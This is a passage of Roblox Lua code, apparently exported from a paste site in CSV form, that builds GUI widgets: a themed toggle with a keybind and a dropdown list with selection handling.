id,title,username,language,date,content
				toggle.Label.Name = ""Label""
				toggle.Label.AutoButtonColor = false
				toggle.Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				toggle.Label.BackgroundTransparency = 1
				toggle.Label.Position = UDim2.fromOffset(toggle.Main.AbsoluteSize.X + 10, - 2)
				toggle.Label.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 71, toggle.BlackOutline.Size.Y.Offset)
				toggle.Label.Font = window.theme.font
				toggle.Label.ZIndex = 5
				toggle.Label.Text = toggle.text
				toggle.Label.TextColor3 = window.theme.itemscolor
				toggle.Label.TextSize = 15
				toggle.Label.TextStrokeTransparency = 1
				toggle.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					toggle.Label.Font = theme.font
					toggle.Label.TextColor3 = toggle.value and window.theme.itemscolor2 or theme.itemscolor
				end)

				toggle.CheckedFrame = Instance.new(""Frame"", toggle.Main)
				toggle.CheckedFrame.ZIndex = 5
				toggle.CheckedFrame.BorderSizePixel = 0
				toggle.CheckedFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				toggle.CheckedFrame.Size = toggle.Main.Size

				toggle.Gradient2 = Instance.new(""UIGradient"", toggle.CheckedFrame)
				toggle.Gradient2.Rotation = (22.5 * 13)
				toggle.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.accentcolor2), ColorSequenceKeypoint.new(1, window.theme.accentcolor)})
				updateevent.Event:Connect(function(theme)
					toggle.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.accentcolor2), ColorSequenceKeypoint.new(1, theme.accentcolor)})
				end)

				toggle.Items = Instance.new(""Frame"", toggle.Main)
				toggle.Items.Name = ""\n""
				toggle.Items.ZIndex = 4
				toggle.Items.Size = UDim2.fromOffset(60, toggle.BlackOutline.AbsoluteSize.Y)
				toggle.Items.BorderSizePixel = 0
				toggle.Items.BackgroundTransparency = 1
				toggle.Items.BackgroundColor3 = Color3.new(0, 0, 0)
				toggle.Items.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 71, 0)

				toggle.ListLayout = Instance.new(""UIListLayout"", toggle.Items)
				toggle.ListLayout.FillDirection = Enum.FillDirection.Horizontal
				toggle.ListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				toggle.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				toggle.ListLayout.Padding = UDim.new(0.04, 6)

				if toggle.flag and toggle.flag ~= """" then
					library.flags[toggle.flag] = toggle.default or false
				end

				function toggle:Set(value)
					if value then
						toggle.Label.TextColor3 = window.theme.itemscolor2
					else
						toggle.Label.TextColor3 = window.theme.itemscolor
					end

					toggle.value = value
					toggle.CheckedFrame.Visible = value
					if toggle.flag and toggle.flag ~= """" then
						library.flags[toggle.flag] = toggle.value
					end
					pcall(toggle.callback, value)
				end

				function toggle:Get()
					return toggle.value
				end

				toggle:Set(toggle.default)

				function toggle:AddKeybind(default, flag)
					local keybind = {}

					keybind.default = default or ""None""
					keybind.value = keybind.default
					keybind.flag = flag or ((toggle.text or """") .. #toggle.Items:GetChildren())

					local shorter_keycodes = {
						[""LeftShift""] = ""LSHIFT"", 
						[""RightShift""] = ""RSHIFT"", 
						[""LeftControl""] = ""LCTRL"", 
						[""RightControl""] = ""RCTRL"", 
						[""LeftAlt""] = ""LALT"", 
						[""RightAlt""] = ""RALT""
					}

					local text = keybind.default == ""None"" and ""[None]"" or ""["" .. (shorter_keycodes[keybind.default.Name] or keybind.default.Name) .. ""]""
					local size = textservice:GetTextSize(text, 15, window.theme.font, Vector2.new(2000, 2000))

					keybind.Main = Instance.new(""TextButton"", toggle.Items)
					keybind.Main.Name = ""keybind""
					keybind.Main.BackgroundTransparency = 1
					keybind.Main.BorderSizePixel = 0
					keybind.Main.ZIndex = 5
					keybind.Main.Size = UDim2.fromOffset(size.X + 2, size.Y - 7)
					keybind.Main.Text = text
					keybind.Main.Font = window.theme.font
					keybind.Main.TextColor3 = Color3.fromRGB(136, 136, 136)
					keybind.Main.TextSize = 15
					keybind.Main.TextXAlignment = Enum.TextXAlignment.Right
					keybind.Main.MouseButton1Down:Connect(function()
						keybind.Main.Text = ""[...]""
						keybind.Main.TextColor3 = window.theme.accentcolor
					end)
					updateevent.Event:Connect(function(theme)
						keybind.Main.Font = theme.font
						if keybind.Main.Text == ""[...]"" then
							keybind.Main.TextColor3 = theme.accentcolor
						else
							keybind.Main.TextColor3 = Color3.fromRGB(136, 136, 136)
						end
					end)

					if keybind.flag and keybind.flag ~= """" then
						library.flags[keybind.flag] = keybind.default
					end
					function keybind:Set(key)
						if key == ""None"" then
							keybind.Main.Text = ""["" .. key .. ""]""
							keybind.value = key
							if keybind.flag and keybind.flag ~= """" then
								library.flags[keybind.flag] = key
							end
						end
						keybind.Main.Text = ""["" .. (shorter_keycodes[key.Name] or key.Name) .. ""]""
						keybind.value = key
						if keybind.flag and keybind.flag ~= """" then
							library.flags[keybind.flag] = keybind.value
						end
					end

					function keybind:Get()
						return keybind.value
					end

					uis.InputBegan:Connect(function(input, gameProcessed)
						if not gameProcessed then
							if keybind.Main.Text == ""[...]"" then
								keybind.Main.TextColor3 = Color3.fromRGB(136, 136, 136)
								if input.UserInputType == Enum.UserInputType.Keyboard then
									keybind:Set(input.KeyCode)
								else
									keybind:Set(""None"")
								end
							else
								if keybind.value ~= ""None"" and input.KeyCode == keybind.value then
									toggle:Set(not toggle.CheckedFrame.Visible)
								end
							end
						end
					end)

					table.insert(library.items, keybind)

					return keybind
				end

				function toggle:AddDropdown(items, default, multichoice, callback, flag)
					local dropdown = {}

					dropdown.defaultitems = items or {}
					dropdown.default = default
					dropdown.callback = callback or function() end
					dropdown.multichoice = multichoice or false
					dropdown.values = {}
					dropdown.flag = flag or ((toggle.text or """") .. #sector.Items:GetChildren() .. ""a"")

					dropdown.Main = Instance.new(""TextButton"", sector.Items)
					dropdown.Main.Name = ""dropdown""
					dropdown.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.BorderSizePixel = 0
					dropdown.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 16)
					dropdown.Main.Position = UDim2.fromOffset(0, 0)
					dropdown.Main.ZIndex = 5
					dropdown.Main.AutoButtonColor = false
					dropdown.Main.Font = window.theme.font
					dropdown.Main.Text = """"
					dropdown.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.TextSize = 15
					dropdown.Main.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.Main.Font = theme.font
					end)

					dropdown.Gradient = Instance.new(""UIGradient"", dropdown.Main)
					dropdown.Gradient.Rotation = 90
					dropdown.Gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))}

					dropdown.SelectedLabel = Instance.new(""TextLabel"", dropdown.Main)
					dropdown.SelectedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.BackgroundTransparency = 1
					dropdown.SelectedLabel.Position = UDim2.fromOffset(5, 2)
					dropdown.SelectedLabel.Size = UDim2.fromOffset(130, 13)
					dropdown.SelectedLabel.Font = window.theme.font
					dropdown.SelectedLabel.Text = toggle.text
					dropdown.SelectedLabel.ZIndex = 5
					dropdown.SelectedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.TextSize = 15
					dropdown.SelectedLabel.TextStrokeTransparency = 1
					dropdown.SelectedLabel.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.SelectedLabel.Font = theme.font
					end)

					dropdown.Nav = Instance.new(""ImageButton"", dropdown.Main)
					dropdown.Nav.Name = ""navigation""
					dropdown.Nav.BackgroundTransparency = 1
					dropdown.Nav.LayoutOrder = 10
					dropdown.Nav.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 26, 5)
					dropdown.Nav.Rotation = 90
					dropdown.Nav.ZIndex = 5
					dropdown.Nav.Size = UDim2.fromOffset(8, 8)
					dropdown.Nav.Image = ""rbxassetid://4918373417""
					dropdown.Nav.ImageColor3 = Color3.fromRGB(210, 210, 210)

					dropdown.BlackOutline2 = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2.Name = ""blackline""
					dropdown.BlackOutline2.ZIndex = 4
					dropdown.BlackOutline2.Size = dropdown.Main.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2.BorderSizePixel = 0
					dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.Outline = Instance.new(""Frame"", dropdown.Main)
					dropdown.Outline.Name = ""blackline""
					dropdown.Outline.ZIndex = 4
					dropdown.Outline.Size = dropdown.Main.Size + UDim2.fromOffset(4, 4)
					dropdown.Outline.BorderSizePixel = 0
					dropdown.Outline.BackgroundColor3 = window.theme.outlinecolor
					dropdown.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						dropdown.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutline = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline.Name = ""blackline444""
					dropdown.BlackOutline.ZIndex = 4
					dropdown.BlackOutline.Size = dropdown.Main.Size + UDim2.fromOffset(2, 2)
					dropdown.BlackOutline.BorderSizePixel = 0
					dropdown.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.ItemsFrame = Instance.new(""ScrollingFrame"", dropdown.Main)
					dropdown.ItemsFrame.Name = ""itemsframe""
					dropdown.ItemsFrame.BorderSizePixel = 0
					dropdown.ItemsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					dropdown.ItemsFrame.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
					dropdown.ItemsFrame.ScrollBarThickness = 2
					dropdown.ItemsFrame.ZIndex = 8
					dropdown.ItemsFrame.ScrollingDirection = ""Y""
					dropdown.ItemsFrame.Visible = false
					dropdown.ItemsFrame.Size = UDim2.new(0, 0, 0, 0)
					dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.Main.AbsoluteSize.X, 0)

					dropdown.ListLayout = Instance.new(""UIListLayout"", dropdown.ItemsFrame)
					dropdown.ListLayout.FillDirection = Enum.FillDirection.Vertical
					dropdown.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

					dropdown.ListPadding = Instance.new(""UIPadding"", dropdown.ItemsFrame)
					dropdown.ListPadding.PaddingTop = UDim.new(0, 2)
					dropdown.ListPadding.PaddingBottom = UDim.new(0, 2)
					dropdown.ListPadding.PaddingLeft = UDim.new(0, 2)
					dropdown.ListPadding.PaddingRight = UDim.new(0, 2)

					dropdown.BlackOutline2Items = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2Items.Name = ""blackline3""
					dropdown.BlackOutline2Items.ZIndex = 7
					dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2Items.BorderSizePixel = 0
					dropdown.BlackOutline2Items.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2Items.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 3, - 3)
					dropdown.BlackOutline2Items.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2Items.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.OutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.OutlineItems.Name = ""blackline8""
					dropdown.OutlineItems.ZIndex = 7
					dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
					dropdown.OutlineItems.BorderSizePixel = 0
					dropdown.OutlineItems.BackgroundColor3 = window.theme.outlinecolor
					dropdown.OutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 2, - 2)
					dropdown.OutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.OutlineItems.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutlineItems.Name = ""blackline3""
					dropdown.BlackOutlineItems.ZIndex = 7
					dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(- 2, - 2)
					dropdown.BlackOutlineItems.BorderSizePixel = 0
					dropdown.BlackOutlineItems.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 1, - 1)
					dropdown.BlackOutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutlineItems.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.IgnoreBackButtons = Instance.new(""TextButton"", dropdown.Main)
					dropdown.IgnoreBackButtons.BackgroundTransparency = 1
					dropdown.IgnoreBackButtons.BorderSizePixel = 0
					dropdown.IgnoreBackButtons.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
					dropdown.IgnoreBackButtons.Size = UDim2.new(0, 0, 0, 0)
					dropdown.IgnoreBackButtons.ZIndex = 7
					dropdown.IgnoreBackButtons.Text = """"
					dropdown.IgnoreBackButtons.Visible = false
					dropdown.IgnoreBackButtons.AutoButtonColor = false

					if dropdown.flag and dropdown.flag ~= """" then
						library.flags[dropdown.flag] = dropdown.multichoice and {dropdown.default or dropdown.defaultitems[1] or """"} or (dropdown.default or dropdown.defaultitems[1] or """")
					end

					function dropdown:isSelected(item)
						for i, v in pairs(dropdown.values) do
							if v == item then
								return true
							end
						end

						return false
					end

					function dropdown:updateText(text)
						if #text >= 27 then
							text = text:sub(1, 25) .. ""..""
						end
						dropdown.SelectedLabel.Text = text
					end

					dropdown.Changed = Instance.new(""BindableEvent"")
					function dropdown:Set(value)
						if type(value) == ""table"" then
							dropdown.values = value
							dropdown:updateText(table.concat(value, "", ""))
							pcall(dropdown.callback, value)
						else
							dropdown:updateText(value)
							dropdown.values = {value}
							pcall(dropdown.callback, value)
						end

						dropdown.Changed:Fire(value)
						if dropdown.flag and dropdown.flag ~= """" then
							library.flags[dropdown.flag] = dropdown.multichoice and dropdown.values or dropdown.values[1]
						end
					end

					function dropdown:Get()
						return dropdown.multichoice and dropdown.values or dropdown.values[1]
					end

					dropdown.items = {}
					function dropdown:Add(v)
						local Item = Instance.new(""TextButton"", dropdown.ItemsFrame)
						Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
						Item.TextColor3 = Color3.fromRGB(255, 255, 255)
						Item.BorderSizePixel = 0
						Item.Position = UDim2.fromOffset(0, 0)
						Item.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset - 4, 20)
						Item.ZIndex = 9
						Item.Text = v
						Item.Name = v
						Item.AutoButtonColor = false
						Item.Font = window.theme.font
						Item.TextSize = 15
						Item.TextXAlignment = Enum.TextXAlignment.Left
						Item.TextStrokeTransparency = 1
						dropdown.ItemsFrame.CanvasSize = dropdown.ItemsFrame.CanvasSize + UDim2.fromOffset(0, Item.AbsoluteSize.Y)

						Item.MouseButton1Down:Connect(function()
							if dropdown.multichoice then
								if dropdown:isSelected(v) then
									for i2, v2 in pairs(dropdown.values) do
										if v2 == v then
